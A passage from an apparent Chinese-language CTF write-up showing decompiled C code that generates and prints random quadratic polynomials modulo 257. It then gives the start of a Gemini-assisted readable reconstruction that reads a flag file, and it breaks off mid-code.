</span></span><span class=line><span class=cl>      <span class=n>iVar10</span> <span class=o>=</span> <span class=n>iVar10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>uVar12</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=mh>0x7fffff7e</span> <span class=o>&lt;</span> <span class=n>uVar12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>%</span> <span class=mh>0x101</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>func_1430</span><span class=p>(</span><span class=n>puVar13</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>uVar12</span> <span class=o>%</span> <span class=mh>0x101</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>uVar12</span> <span class=o>=</span> <span class=n>puVar13</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>piVar11</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=n>puVar13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>uVar7</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar11</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>((</span><span class=o>*</span><span class=n>piVar11</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>((</span><span class=n>piVar11</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>||</span> <span class=p>(</span><span class=n>piVar11</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>))))</span> <span class=k>goto</span> <span class=n>LAB_00008a30</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>uVar7</span> <span class=o>=</span> <span class=n>uVar7</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>piVar11</span> <span class=o>=</span> <span class=n>piVar11</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>==</span> <span class=n>uVar7</span><span class=p>)</span> <span class=k>goto</span> <span class=n>LAB_000089fc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>piVar11</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=k>goto</span> <span class=n>LAB_00008a30</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>uVar7</span> <span class=o>=</span> <span class=n>uVar7</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>piVar11</span> <span class=o>=</span> <span class=n>piVar11</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>!=</span> <span class=n>uVar7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_000089fc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>uVar12</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>uVar12</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>uVar7</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>uVar7</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>func_1430</span><span class=p>(</span><span class=n>puVar13</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>uVar12</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>,(</span><span class=n>uVar7</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_00008a30</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar13</span> <span class=o>=</span> <span class=n>puVar13</span> <span class=o>+</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>puVar13</span> <span class=o>!=</span> <span class=n>local_9c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>puStack_e4</span> <span class=o>=</span> <span class=n>local_6c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>puVar13</span> <span class=o>=</span> <span class=n>local_9c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>puVar13</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar13</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar13</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar15</span> <span class=o>=</span> <span class=n>puVar18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar16</span> <span class=o>=</span> <span class=n>puStack_e4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>iVar10</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=o>*</span><span class=n>puVar16</span> <span class=o>%</span> <span class=mh>0x101</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>iVar10</span> <span class=o>=</span> <span class=n>iVar10</span> <span class=o>+</span> <span class=mh>0x101</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_00008a6e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>uVar12</span> <span class=o>=</span> <span class=n>puVar15</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>puVar19</span> <span class=o>=</span> <span class=p>(</span><span class=n>undefined4</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=n>puVar15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>uVar7</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>iVar14</span> <span class=o>=</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>*</span> <span class=n>puVar19</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span> <span class=o>%</span> <span class=mh>0x101</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>iVar14</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=n>iVar14</span> <span class=o>=</span> <span class=n>iVar14</span> <span class=o>+</span> <span class=mh>0x101</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>uVar7</span> <span class=o>=</span> <span class=n>uVar7</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nf>func_1430</span><span class=p>(</span><span class=n>puVar13</span><span class=p>,</span><span class=o>*</span><span class=n>puVar19</span><span class=p>,</span><span class=n>puVar19</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=n>puVar19</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span><span class=n>iVar14</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>puVar19</span> <span class=o>=</span> <span class=n>puVar19</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>!=</span> <span class=n>uVar7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=k>goto</span> <span class=n>LAB_00008a6e</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>puVar15</span> <span class=o>=</span> <span class=n>puVar15</span> <span class=o>+</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>puVar16</span> <span class=o>=</span> <span class=n>puVar16</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>puVar15</span> <span class=o>!=</span> <span class=n>local_9c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puStack_e4</span> <span class=o>=</span> <span class=n>puStack_e4</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar13</span> <span class=o>=</span> <span class=n>puVar13</span> <span class=o>+</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>local_6c</span> <span class=o>==</span> <span class=n>puVar13</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>iVar10</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>puVar13</span> <span class=o>=</span> <span class=n>local_9c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>iVar10</span> <span class=o>=</span> <span class=n>iVar10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>iVar14</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;P%d(&#34;</span><span class=p>,</span><span class=n>iVar10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;x%d&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>iVar14</span> <span class=o>=</span> <span class=n>iVar14</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=nf>putchar</span><span class=p>(</span><span class=mh>0x2c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;x%d&#34;</span><span class=p>,</span><span class=n>iVar14</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>iVar14</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;) = &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>sVar1</span> <span class=o>=</span> <span class=n>puVar13</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>sVar1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;0 (mod %d)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mh>0x101</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>__dest_00</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>sVar1</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>sVar17</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=nf>memcpy</span><span class=p>(</span><span class=n>__dest_00</span><span class=p>,(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=n>puVar13</span><span class=p>,</span><span class=n>sVar1</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>qsort</span><span class=p>(</span><span class=n>__dest_00</span><span class=p>,</span><span class=n>sVar1</span><span class=p>,</span><span class=mh>0x10</span><span class=p>,</span><span class=n>func_15f0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>bVar8</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>piVar11</span> <span class=o>=</span> <span class=n>__dest_00</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>iVar14</span> <span class=o>=</span> <span class=n>piVar11</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>iVar14</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>(</span><span class=n>bVar8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34; + &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>iVar14</span> <span class=o>=</span> <span class=n>piVar11</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar11</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>iVar2</span> <span class=o>=</span> <span class=n>piVar11</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar11</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=k>if</span> <span class=p>(</span><span class=n>iVar14</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;x%d&#34;</span><span class=p>,</span><span class=n>iVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d*x%d&#34;</span><span class=p>,</span><span class=n>iVar14</span><span class=p>,</span><span class=n>iVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>piVar11</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=n>piVar11</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=k>if</span> <span class=p>(</span><span class=n>iVar14</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;x%d^2&#34;</span><span class=p>,</span><span class=n>iVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d*x%d^2&#34;</span><span class=p>,</span><span class=n>iVar14</span><span class=p>,</span><span class=n>iVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>iVar14</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;x%d*x%d&#34;</span><span class=p>,</span><span class=n>iVar2</span><span class=p>,</span><span class=n>piVar11</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d*x%d*x%d&#34;</span><span class=p>,</span><span class=n>iVar14</span><span class=p>,</span><span class=n>iVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=n>bVar8</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>sVar17</span> <span class=o>=</span> <span class=n>sVar17</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>piVar11</span> <span class=o>=</span> <span class=n>piVar11</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>sVar1</span> <span class=o>!=</span> <span class=n>sVar17</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>free</span><span class=p>(</span><span class=n>__dest_00</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34; (mod %d)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mh>0x101</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>puVar13</span> <span class=o>=</span> <span class=n>puVar13</span> <span class=o>+</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>puStack_e0</span> <span class=o>=</span> <span class=n>local_9c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>!=</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=n>puVar18</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>puVar18</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>puVar18</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>puVar18</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>puVar18</span> <span class=o>=</span> <span class=n>puVar18</span> <span class=o>+</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=n>puStack_e0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>puStack_e0</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>puStack_e0</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>puStack_e0</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>puStack_e0</span> <span class=o>=</span> <span class=n>puStack_e0</span> <span class=o>+</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>puVar18</span> <span class=o>!=</span> <span class=n>local_9c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>while</span><span class=p>(</span> <span class=nb>true</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>使用Gemini分析可以得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// 假设存在一个多项式处理的结构和函数
</span></span></span><span class=line><span class=cl><span class=c1>// Term: 表示多项式中的一个项，如 5*x1*x3
</span></span></span><span class=line><span class=cl><span class=c1>// Polynomial: 多个Term的集合
</span></span></span><span class=line><span class=cl><span class=c1>// generate_random_polynomial(): 创建一个随机的二次多项式
</span></span></span><span class=line><span class=cl><span class=c1>// combine_polynomials(): 将多个多项式进行线性组合
</span></span></span><span class=line><span class=cl><span class=c1>// print_polynomial(): 以可读格式打印多项式
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp>#define MODULUS 257 </span><span class=c1>// 0x101
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 1. 读取并处理输入文件
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span><span class=o>*</span> <span class=n>file_content</span> <span class=o>=</span> <span class=n>read_file_content</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>file_content</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>trimmed_input</span> <span class=o>=</span> <span class=n>trim_whitespace</span><span class=p>(</span><span class=n>file_content</span><span class=p>);</span> <span class=c1>// 去除首尾空白字符
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl>    <span class=c1>// 2. 将输入的前16个字节作为系数
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>input_coeffs</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span> <span class=o>&amp;&amp;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>strlen</span><span class=p>(</span><span class=n>trimmed_input</span><span class=p>);</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>input_coeffs</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=p>)</span><span class=n>trimmed_input</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>file_content</span><span class=p>);</span> <span class=c1>// 释放原始文件内容内存
</span></span></span><span class=line><span class=cl><span class=c1></span>
